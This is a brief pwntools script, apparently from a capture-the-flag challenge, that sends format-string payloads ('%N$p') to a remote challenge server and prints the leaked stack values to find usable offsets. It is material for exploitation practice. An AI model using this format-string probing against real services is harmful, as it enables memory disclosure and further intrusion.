from pwn import *

exe = './snow-factory/snow_factory'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'critical'

def fuzz():
    for i in range(1, 30):
        try:
            p = remote('snow-factory.julec.tf', 1337)            
            p.sendlineafter(b"What's your name: \n", '%{}$p'.format(i).encode())
            p.recvuntil(b"Hello ")
            result = p.recvline().decode().strip()            
            print(f"{i}: {result}")
            p.close()
        except EOFError:
            pass

if __name__ == "__main__":
    fuzz()
